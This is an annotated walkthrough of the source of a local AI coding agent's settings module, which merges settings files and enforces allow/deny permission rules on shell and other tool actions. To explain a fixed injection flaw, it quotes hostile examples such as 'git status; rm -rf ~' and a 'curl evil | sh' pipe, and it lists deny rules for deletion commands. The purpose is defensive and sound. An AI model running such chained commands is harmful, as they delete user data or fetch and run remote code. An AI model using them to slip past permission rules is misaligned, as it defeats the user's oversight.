# `localagent/settings.py` — settings files and permission rules

**Role in the flow:** decides, *before* anyone is asked, whether an action may happen. Claude Code has the same idea
(`settings.json` with `allow`/`deny` lists). Without rules you would be asked about every run, test and command; with
them, safe routine actions just happen, dangerous ones never happen, and only the rest is asked.

```
                 action (tool + subject)
                          │
          matches a DENY rule? ──yes──► refused, never asked
                          │no
          matches an ALLOW rule? ──yes──► runs, not asked
                          │no
                 ask you: [y]es / [n]o / [a]lways  ("a" saves an allow rule)
```

**Where rules live** (both optional, merged): `%USERPROFILE%\.localagent\settings.json` (all projects) and
`<project>\.localagent\settings.json` (one project; "always" answers are saved here). Example:

```json
{
  "permissions": {
    "allow": ["run_tests", "run_python(*)", "run_shell(git status*)", "run_shell(git diff*)",
              "fetch_url(https://docs.python.org/*)"],
    "deny":  ["run_shell(*rm *)", "run_shell(*del *)", "run_shell(*--force*)"]
  },
  "mcpServers": {
    "files": {"command": "npx", "args": ["-y", "@modelcontextprotocol/server-filesystem", "."]}
  },
  "hooks": {"after_edit": "ruff check {file}", "after_request": "python -m pytest -q"},
  "test_command": "npm test",
  "env": {"LOCALAGENT_MODE": "offline", "LOCALAGENT_GPU_LAYERS": "9"}
}
```
`hooks` are your own commands run automatically (see `tools.md`): `after_edit` after every file write (a failure is
shown to the model), `after_request` after every request (shown to you). `{file}` is replaced by the file's name,
quoted when needed — do not add quotes yourself.
`test_command` is what `run_tests` runs; without it the agent picks pytest, unittest, `npm test`, `go test` or
`cargo test` itself (see `runners.md`).
`env` sets environment variables — any `LOCALAGENT_*` setting from `05-user-manual.md` — for every run, unless the
variable is already set (a real variable wins). Put a Gemini key only in the **user** file: a project file may end up
in git.

**Command lines with several commands.** A rule such as `run_shell(git *)` approves `git status`. Before version 0.6 it
also approved `git status; rm -rf ~`, because `*` matches anything — including a second command. Now a command line is
split at `&&`, `||`, `;`, `|` and `&`, and **every** part must match an allow rule (and no part a deny rule). Lines with
command substitution (`$(...)`, backticks), parentheses (PowerShell runs `(...)` as a command), redirection (`<`, `>`)
or several lines are always asked — unless you answered "always" to exactly that line before.

| Tool name in rules | Subject matched by the pattern in brackets |
|---|---|
| `run_python` | the file, e.g. `run_python(scripts/*)` |
| `run_tests` | nothing (use the bare name) |
| `run_shell` | the whole command line, e.g. `run_shell(npm test)` |
| `fetch_url` | the address, e.g. `fetch_url(https://docs.python.org/*)` |
| `mcp__<server>__<tool>` | the arguments as JSON; wildcards in the name work: `mcp__files__*` |

Patterns use shell-style wildcards: `*` any text, `?` one character. Matching is case-sensitive.

## Module header
```python
  1 | """Settings files and permission rules, in the style of Claude Code's settings.json.
  2 | 
  3 | Two optional JSON files are merged (user rules first, then project rules):
  4 |   ~/.localagent/settings.json             your rules for every project
  5 |   <project>/.localagent/settings.json     rules for one project ("always" answers are saved here)
  6 | 
  7 | Example:
  8 |   {"permissions": {"allow": ["run_tests", "run_shell(git status*)",
  9 |                              "fetch_url(https://docs.python.org/*)"],
 10 |                    "deny":  ["run_shell(*rm *)", "run_shell(*--force*)"]},
 11 |    "mcpServers": {"files": {"command": "npx",
 12 |                             "args": ["-y", "@modelcontextprotocol/server-filesystem", "."]}},
 13 |    "hooks": {"after_edit": "ruff check {file}", "after_request": "python -m pytest -q"},
 14 |    "test_command": "npm test",
 15 |    "env": {"LOCALAGENT_MODE": "offline"}}
 16 | 
 17 | A rule is a tool name (wildcards allowed, e.g. ``mcp__files__*``), optionally followed by
 18 | a pattern in brackets that must match the action's subject: the command line for
 19 | run_shell, the file for run_python, the URL for fetch_url, the arguments for MCP tools.
 20 | Deny rules win over allow rules; an action that matches neither is asked. A shell command
 21 | line made of several commands (``a && b``, ``a; b``, ``a | b``) is allowed only when every
 22 | part is; one with command substitution, grouping, redirection or several lines is always
 23 | asked, unless an "always" answer approved exactly that line.
 24 | ``env`` sets environment variables (any ``LOCALAGENT_*`` setting) unless they are already set.
 25 | """
 26 | from __future__ import annotations
 27 | 
 28 | import json
 29 | import os
 30 | import re
 31 | from dataclasses import dataclass, field
 32 | from fnmatch import fnmatchcase
 33 | from pathlib import Path
 34 | from urllib.parse import urlsplit
 35 | 
 36 | USER_SETTINGS = Path.home() / ".localagent" / "settings.json"
 37 | PROJECT_SETTINGS = Path(".localagent") / "settings.json"     # relative to the workspace
 38 | USER_COMMANDS = Path.home() / ".localagent" / "commands"     # custom slash commands (*.md)
 39 | PROJECT_COMMANDS = Path(".localagent") / "commands"
 40 | SHELL_SPLIT = re.compile(r"&&|\|\||[;&|]")                     # between two commands
 41 | SHELL_UNSAFE = ("`", "$(", "(", ")", "<", ">", "\n", "\r")    # hide or redirect commands
 42 | ESCAPED = re.compile(r"\[[*?\[]\]")                            # [*] [?] [[] = literal characters
 43 | 
 44 | 
```
- The docstring is the user guide in brief. `json` reads and writes the files; `os` sets environment variables;
  `dataclass`/`field` build `Permissions`; `fnmatchcase` matches wildcards (case-sensitive on every system, so a rule
  means the same on Windows and Linux); `urlsplit` takes a URL apart for website rules.
- `USER_SETTINGS` and `PROJECT_SETTINGS` are the two file locations (the project one is relative to the workspace);
  `USER_COMMANDS` and `PROJECT_COMMANDS` the folders for custom slash commands. `re` checks command names.
- `SHELL_SPLIT` finds the places between two commands (`&&`, `||`, `;`, `|`, `&`); `SHELL_UNSAFE` lists the marks that
  can hide or redirect a command; `ESCAPED` recognises the escapes `[*]`, `[?]` and `[[]` (a wildcard character made
  literal).

## Reading the files
```python
 45 | def read_json(path: Path) -> dict:
 46 |     """A settings file as a dict; a missing file is empty, a broken one is an error."""
 47 |     if not path.is_file():
 48 |         return {}
 49 |     try:
 50 |         data = json.loads(path.read_text(encoding="utf-8"))
 51 |     except (ValueError, OSError) as exc:
 52 |         raise ValueError(f"{path}: not valid JSON ({exc})") from None
 53 |     if not isinstance(data, dict):
 54 |         raise ValueError(f"{path}: must contain a JSON object {{...}}")
 55 |     return data
 56 | 
 57 | 
```
- A missing file is simply "no settings". A file that is not valid JSON, or not a `{...}` object, is an **error** with
  the file name — silently ignoring a broken file could silently drop your deny rules.

```python
 58 | def load_settings(workspace: Path, user_file: Path = USER_SETTINGS) -> dict:
 59 |     """Merge the user and project settings files into one dict (project values win)."""
 60 |     merged: dict = {"permissions": {"allow": [], "deny": []}, "mcpServers": {}, "hooks": {},
 61 |                     "env": {}, "test_command": ""}
 62 |     for path in (user_file, workspace / PROJECT_SETTINGS):
 63 |         data = read_json(path)
 64 |         rules = data.get("permissions", {})
 65 |         for kind in ("allow", "deny"):
 66 |             merged["permissions"][kind] += [str(rule) for rule in rules.get(kind, [])]
 67 |         merged["mcpServers"].update(data.get("mcpServers", {}))
 68 |         merged["hooks"].update(data.get("hooks", {}))           # project hooks replace user ones
 69 |         merged["env"].update({str(k): str(v) for k, v in data.get("env", {}).items()})
 70 |         merged["test_command"] = str(data.get("test_command") or merged["test_command"])
 71 |     return merged
 72 | 
 73 | 
```
- Starts from empty lists, then adds the user file's rules and the project file's rules (both kinds simply
  accumulate, so a project cannot remove a user's deny rule). MCP server definitions, hooks and `env` variables are
  merged by name (the project wins on a clash); a project's `test_command` replaces the user's.

```python
 74 | def save_user_env(name: str, value: str, path: Path = USER_SETTINGS) -> Path:
 75 |     """Remember ``name=value`` in your user settings file's ``env`` (used by `localagent setup`
 76 |     and `localagent models use`); the rest of the file is kept as it is."""
 77 |     data = read_json(path)
 78 |     data.setdefault("env", {})[name] = value
 79 |     path.parent.mkdir(parents=True, exist_ok=True)
 80 |     path.write_text(json.dumps(data, indent=2) + "\n", encoding="utf-8")
 81 |     return path
 82 | 
 83 | 
```
- Writes one `env` variable into your **user** settings file and keeps everything else in it (rules, servers, other
  variables). `localagent setup` saves the Gemini key this way and `localagent models use` the chosen model, so both
  apply to every project from the next start on.

```python
 84 | def apply_env(settings: dict) -> list[str]:
 85 |     """Set the settings' ``env`` variables that are not set already; returns their names.
 86 | 
 87 |     A real environment variable wins, so ``setx`` (or a one-off ``$env:X=...``) still overrides
 88 |     a settings file.
 89 |     """
 90 |     applied = []
 91 |     for name, value in settings.get("env", {}).items():
 92 |         if name not in os.environ:
 93 |             os.environ[name] = value
 94 |             applied.append(name)
 95 |     return applied
 96 | 
 97 | 
```
- Sets each `env` variable that is not set yet and returns the names it set. The CLI calls it **before** reading the
  configuration, so `"env": {"LOCALAGENT_MODE": "offline"}` works exactly like `setx LOCALAGENT_MODE offline` — but a
  variable you really set (with `setx`, or `$env:X = ...` for one terminal) still wins.

## Custom slash commands
Like Claude Code's custom commands: put a Markdown file in `<project>\.localagent\commands\` (or
`%USERPROFILE%\.localagent\commands\` for every project). `review.md` becomes `/review`; its text is the request,
and `$ARGUMENTS` is replaced by whatever you type after the command. Example `review.md`:
```
Review $ARGUMENTS for bugs, unclear names and missing error handling. Do not change anything;
list the problems with file:line and a suggested fix.
```
Then `/review src/app.py`. The first line of the file is shown in `/help`.

```python
 98 | def load_commands(workspace: Path, user_dir: Path = USER_COMMANDS) -> dict[str, str]:
 99 |     """Custom slash commands: each ``<name>.md`` file becomes ``/<name>`` (project files win)."""
100 |     commands: dict[str, str] = {}
101 |     for folder in (user_dir, workspace / PROJECT_COMMANDS):
102 |         if folder.is_dir():
103 |             for path in sorted(folder.glob("*.md")):
104 |                 name = path.stem.lower()
105 |                 if re.fullmatch(r"[a-z0-9_-]+", name):            # simple, typeable names only
106 |                     commands[name] = path.read_text(encoding="utf-8", errors="replace")
107 |     return commands
108 | 
109 | 
```
- Reads every `*.md` file from the user folder, then the project folder (so a project command replaces a user command
  of the same name). Only simple names (letters, digits, `-`, `_`) become commands.

```python
110 | def expand_command(template: str, arguments: str) -> str:
111 |     """Put the words typed after the command where the file says $ARGUMENTS (else at the end)."""
112 |     if "$ARGUMENTS" in template:
113 |         return template.replace("$ARGUMENTS", arguments).strip()
114 |     return (template.rstrip() + ("\n\n" + arguments if arguments else "")).strip()
115 | 
116 | 
```
- Replaces `$ARGUMENTS` with the typed words; a file without `$ARGUMENTS` gets the words appended as a new paragraph.

## Rules
```python
117 | def parse_rule(rule: str) -> tuple[str, str | None]:
118 |     """``"run_shell(git *)"`` -> ``("run_shell", "git *")``; ``"run_tests"`` -> ``("run_tests", None)``."""
119 |     rule = rule.strip()
120 |     if rule.endswith(")") and "(" in rule:
121 |         name, _, pattern = rule.partition("(")
122 |         return name.strip(), pattern[:-1]
123 |     return rule, None
124 | 
125 | 
```
- Splits `run_shell(git *)` into the tool name and the pattern; a bare name has no pattern.

```python
126 | def matches(rule: str, tool: str, subject: str) -> bool:
127 |     """True when ``rule`` covers this tool and subject (shell-style wildcards)."""
128 |     name, pattern = parse_rule(rule)
129 |     if not fnmatchcase(tool, name):
130 |         return False
131 |     return pattern is None or fnmatchcase(subject, pattern)
132 | 
133 | 
```
- The tool name is matched with wildcards (so `mcp__files__*` covers all of that server's tools); without a pattern
  the rule covers every subject.

```python
134 | def escape_pattern(text: str) -> str:
135 |     """``text`` as a rule pattern that matches only itself (``*``, ``?`` and ``[`` made literal)."""
136 |     return "".join(f"[{char}]" if char in "*?[" else char for char in text)
137 | 
138 | 
```
- Turns text into a pattern that matches only that text: `*`, `?` and `[` become `[*]`, `[?]` and `[[]`. Before 0.6 an
  "always" answer to `ls *.py` saved the rule `run_shell(ls *.py)`, whose `*` then also matched
  `ls x; curl evil | sh; .py`.

```python
139 | def is_exact(pattern: str | None) -> bool:
140 |     """True for a pattern without wildcards, such as the ones "always" answers save."""
141 |     return pattern is not None and not any(char in ESCAPED.sub("", pattern) for char in "*?[")
142 | 
143 | 
```
- True for a pattern without wildcards once the escapes are removed — the kind an "always" answer saves.

```python
144 | def command_parts(command: str) -> list[str] | None:
145 |     """The simple commands in a command line (``git add . && git commit`` gives two), or None
146 |     when it holds something a rule cannot vouch for: command substitution (``$(...)``,
147 |     backticks), grouping (PowerShell runs ``(...)`` as a command), redirection or several lines.
148 | 
149 |     Splitting is deliberately simple: an operator inside quotes also splits, which can only
150 |     make the agent ask more often, never less.
151 |     """
152 |     if any(mark in command for mark in SHELL_UNSAFE):
153 |         return None
154 |     return [part.strip() for part in SHELL_SPLIT.split(command) if part.strip()]
155 | 
156 | 
```
- Splits a command line into its simple commands, or returns `None` when it contains a mark from `SHELL_UNSAFE`. The
  split is deliberately simple: an operator inside quotes (`git commit -m "a; b"`) also splits, which can only make the
  agent ask *more* often, never less.

```python
157 | def suggest_rule(tool: str, subject: str) -> str:
158 |     """The rule an "always allow" answer saves: narrow enough to stay safe."""
159 |     if tool == "run_shell" or tool == "run_python":
160 |         return f"{tool}({escape_pattern(subject)})"     # exactly this command / file
161 |     if tool == "fetch_url":
162 |         parts = urlsplit(subject)
163 |         return f"fetch_url({parts.scheme}://{parts.netloc}/*)"   # this website
164 |     return tool                                         # run_tests, one MCP tool
165 | 
166 | 
```
- What an "always" answer saves — deliberately narrow: exactly this command or this file for shell/python (escaped, so
  it stays exact), the whole website for `fetch_url` (scheme + host + `/*`), and the bare name for `run_tests` and MCP
  tools.

## `Permissions`
```python
167 | @dataclass
168 | class Permissions:
169 |     """Allow/deny rules plus the project file where new "always" rules are saved."""
170 | 
171 |     allow: list[str] = field(default_factory=list)
172 |     deny: list[str] = field(default_factory=list)
173 |     project_file: Path | None = None
174 | 
```
```python
175 |     @classmethod
176 |     def from_settings(cls, settings: dict, project_file: Path | None = None) -> "Permissions":
177 |         rules = settings.get("permissions", {})
178 |         return cls(list(rules.get("allow", [])), list(rules.get("deny", [])), project_file)
179 | 
```
```python
180 |     def decide(self, tool: str, subject: str) -> str:
181 |         """``"deny"``, ``"allow"`` or ``"ask"`` for this action."""
182 |         if any(matches(rule, tool, subject) for rule in self.deny):
183 |             return "deny"
184 |         if tool != "run_shell":
185 |             return "allow" if any(matches(rule, tool, subject) for rule in self.allow) else "ask"
186 |         for rule in self.allow:                 # every command allowed, or exactly this line
187 |             name, pattern = parse_rule(rule)
188 |             if fnmatchcase(tool, name) and (pattern in (None, "*") or (
189 |                     is_exact(pattern) and fnmatchcase(subject, pattern or ""))):
190 |                 return "allow"
191 |         parts = command_parts(subject)
192 |         if not parts:
193 |             return "ask"
194 |         if any(matches(rule, tool, part) for part in parts for rule in self.deny):
195 |             return "deny"
196 |         if all(any(matches(rule, tool, part) for rule in self.allow) for part in parts):
197 |             return "allow"
198 |         return "ask"
199 | 
```
```python
200 |     def always_allow(self, rule: str) -> Path | None:
201 |         """Allow ``rule`` from now on and save it in the project settings (if any)."""
202 |         if rule not in self.allow:
203 |             self.allow.append(rule)
204 |         if self.project_file is None:
205 |             return None
206 |         data = read_json(self.project_file)
207 |         saved = data.setdefault("permissions", {}).setdefault("allow", [])
208 |         if rule not in saved:
209 |             saved.append(rule)
210 |         self.project_file.parent.mkdir(parents=True, exist_ok=True)
211 |         self.project_file.write_text(json.dumps(data, indent=2) + "\n", encoding="utf-8")
212 |         return self.project_file
```
- Holds the allow and deny lists and the project file for saving.
- `from_settings` builds it from merged settings (copies, so changes do not touch the input).
- `decide` checks deny first (deny always wins, matched against the whole subject). For every tool except `run_shell`
  that is followed by the allow rules, else `"ask"`. For `run_shell`:
  1. a rule allowing every command (`run_shell` or `run_shell(*)`) or an exact rule equal to this line allows it — so
     an "always" answer to `pytest -q | tail -5` keeps working although it contains a pipe;
  2. otherwise the line is split by `command_parts`; a line that cannot be split (substitution, redirection, several
     lines) is asked;
  3. any part matching a deny rule refuses the whole line; when every part matches an allow rule it is allowed;
     anything else is asked.
- `always_allow` adds the rule for this session and — if there is a project file — re-reads that file, adds the rule
  once, creates the folder if needed and writes it back nicely indented. It returns where it saved (for the message).
